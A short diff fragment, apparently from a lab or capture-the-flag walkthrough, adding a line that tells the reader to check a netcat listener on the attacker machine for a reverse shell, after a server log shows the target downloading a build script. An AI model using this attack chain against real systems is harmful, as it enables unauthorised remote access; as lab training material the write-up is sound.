@@ -755,6 +755,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.66.180.249 - - [03/Dec/2025 06:56:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
 ```
 
+Check the **netcat listener** on the attacker machine for the reverse shell from the target.
+
 
 <div align="center">
 <br>
